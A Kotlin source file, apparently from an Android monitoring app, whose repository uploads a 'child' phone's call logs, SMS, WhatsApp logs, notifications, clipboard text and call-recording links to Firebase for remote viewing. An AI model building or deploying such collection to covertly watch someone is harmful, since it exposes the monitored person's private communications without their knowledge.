package com.example.authapp.data

import com.example.authapp.config.FirebasePaths
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.Query
import com.google.firebase.firestore.SetOptions

object FirebaseCommunicationsRepository {
    private val database: FirebaseDatabase get() = FirebaseDatabase.getInstance()
    private val firestore: FirebaseFirestore get() = FirebaseFirestore.getInstance()
    private val crashlytics: FirebaseCrashlytics get() = FirebaseCrashlytics.getInstance()

    fun syncCallLogs(childId: String, callLogs: List<CallLogItem>) {
        if (childId.isEmpty() || callLogs.isEmpty()) return
        try {
            val batch = firestore.batch()
            val collection = firestore.collection("call_logs").document(childId).collection("items")
            for (log in callLogs) {
                val key = if (log.id.isNotEmpty()) log.id else "${log.timestamp}_${log.number.takeLast(4)}"
                val docRef = collection.document(key)
                batch.set(docRef, log.copy(id = key), SetOptions.merge())
            }
            batch.commit().addOnFailureListener { e -> crashlytics.recordException(e) }
        } catch (e: Exception) {
            crashlytics.recordException(e)
        }
    }

    fun listenToCallLogs(childId: String, onLogs: (List<CallLogItem>) -> Unit): ValueEventListener =
        FirebaseRepository.listenToChildNodeList("call_logs", childId, limit = 50, transform = { it.sortedByDescending { c -> c.timestamp } }, onData = onLogs)

    fun pushNotification(childId: String, item: NotificationItem) {
        if (childId.isEmpty()) return
        val docRef = firestore.collection("notifications").document(childId).collection("items").document()
        val toSave = item.copy(id = docRef.id)
        docRef.set(toSave, SetOptions.merge())
            .addOnFailureListener { e -> crashlytics.recordException(e) }
    }

    fun listenToNotificationsFirestore(childId: String, limit: Long = 20, onNotifications: (List<NotificationItem>) -> Unit): ListenerRegistration =
        FirebaseRepository.listenFirestoreCollection("notifications", childId, "timestamp", limit, onNotifications)

    fun listenToNotifications(childId: String, onNotifications: (List<NotificationItem>) -> Unit): ValueEventListener =
        FirebaseRepository.listenToChildNodeList("notifications", childId, limit = 50, transform = { it.sortedByDescending { n -> n.timestamp } }, onData = onNotifications)

    fun syncSmsLogs(childId: String, smsList: List<SmsItem>) {
        if (childId.isEmpty() || smsList.isEmpty()) return
        try {
            val batch = firestore.batch()
            val collection = firestore.collection("sms_logs").document(childId).collection("items")
            for (sms in smsList) {
                val key = if (sms.id.isNotEmpty()) sms.id else "${sms.timestamp}_${sms.address.takeLast(4)}"
                val docRef = collection.document(key)
                batch.set(docRef, sms.copy(id = key), SetOptions.merge())
            }
            batch.commit().addOnFailureListener { e -> crashlytics.recordException(e) }
        } catch (e: Exception) {
            crashlytics.recordException(e)
        }
    }

    fun listenToSmsLogs(childId: String, onSms: (List<SmsItem>) -> Unit): ValueEventListener =
        FirebaseRepository.listenToChildNodeList("sms_logs", childId, limit = 50, transform = { it.sortedByDescending { s -> s.timestamp } }, onData = onSms)

    fun logSingleCallLog(childId: String, callLog: CallLogItem) {
        val key = if (callLog.id.isNotEmpty()) callLog.id else "${callLog.timestamp}_${callLog.number.takeLast(4)}"
        FirebaseRepository.saveChildDocumentDual("call_logs", "call_logs", childId, key, callLog.copy(id = key))
    }

    fun attachRecordingUrlToLatestCallLog(childId: String, recordingUrl: String) {
        if (childId.isEmpty() || recordingUrl.isEmpty()) return
        firestore.collection("call_logs").document(childId)
            .collection("items")
            .orderBy("timestamp", Query.Direction.DESCENDING)
            .limit(1)
            .get()
            .addOnSuccessListener { querySnap ->
                val doc = querySnap.documents.firstOrNull() ?: return@addOnSuccessListener
                doc.reference.update("audioRecordingUrl", recordingUrl)
                database.reference.child("call_logs").child(childId).child(doc.id)
                    .child("audioRecordingUrl").setValue(recordingUrl)
            }
            .addOnFailureListener { e -> crashlytics.recordException(e) }
    }

    fun saveCallLogToFirestore(childId: String, callLog: CallLogItem) = logSingleCallLog(childId, callLog)

    fun listenToChildCallLogsFirestore(childId: String, limit: Long = 20, onUpdate: (List<CallLogItem>) -> Unit): ListenerRegistration =
        FirebaseRepository.listenFirestoreCollection("call_logs", childId, "timestamp", limit, onUpdate)

    fun saveSmsLogToFirestore(childId: String, sms: SmsItem) {
        val key = if (sms.id.isNotEmpty()) sms.id else "${sms.timestamp}_${sms.address.takeLast(4)}"
        FirebaseRepository.saveChildDocumentDual("sms_logs", "sms_logs", childId, key, sms.copy(id = key))
    }

    fun listenToChildSmsLogsFirestore(childId: String, limit: Long = 20, onUpdate: (List<SmsItem>) -> Unit): ListenerRegistration =
        FirebaseRepository.listenFirestoreCollection("sms_logs", childId, "timestamp", limit, onUpdate)

    fun pushWhatsAppLog(childId: String, item: WhatsAppLogItem) {
        if (childId.isEmpty()) return
        val docRef = firestore.collection("whatsapp_logs").document(childId).collection("items").document()
        val toSave = item.copy(id = docRef.id)

        docRef.set(toSave, SetOptions.merge())
            .addOnFailureListener { e -> crashlytics.recordException(e) }

        try {
            val ref = database.reference.child(FirebasePaths.WHATSAPP_LOGS).child(childId).child(toSave.id)
            ref.setValue(toSave)
        } catch (_: Exception) {}
    }

    fun listenToWhatsAppLogsFirestore(childId: String, limit: Long = 20, onLogs: (List<WhatsAppLogItem>) -> Unit): ListenerRegistration =
        FirebaseRepository.listenFirestoreCollection("whatsapp_logs", childId, "timestamp", limit, onLogs)

    fun listenToWhatsAppLogs(childId: String, onLogs: (List<WhatsAppLogItem>) -> Unit): ValueEventListener =
        FirebaseRepository.listenToChildNodeList(FirebasePaths.WHATSAPP_LOGS, childId, limit = 100, transform = { it.sortedByDescending { w -> w.timestamp } }, onData = onLogs)

    fun pushClipboardLog(childId: String, text: String) {
        val trimmed = text.trim()
        if (childId.isEmpty() || trimmed.isEmpty()) return
        val docRef = firestore.collection("clipboard_logs").document(childId).collection("items").document()
        val item = ClipboardLogItem(
            id = docRef.id,
            text = trimmed,
            timestamp = System.currentTimeMillis()
        )

        docRef.set(item, SetOptions.merge())
            .addOnFailureListener { e -> crashlytics.recordException(e) }

        try {
            database.reference.child(FirebasePaths.CLIPBOARD_LOGS).child(childId).child(item.id).setValue(item)
        } catch (_: Exception) {}
    }

    fun listenToClipboardLogsFirestore(childId: String, limit: Long = 50, onLogs: (List<ClipboardLogItem>) -> Unit): ListenerRegistration =
        FirebaseRepository.listenFirestoreCollection("clipboard_logs", childId, "timestamp", limit, onLogs)

    fun listenToClipboardLogs(childId: String, onLogs: (List<ClipboardLogItem>) -> Unit): ValueEventListener =
        FirebaseRepository.listenToChildNodeList(FirebasePaths.CLIPBOARD_LOGS, childId, limit = 100, transform = { it.sortedByDescending { c -> c.timestamp } }, onData = onLogs)
}
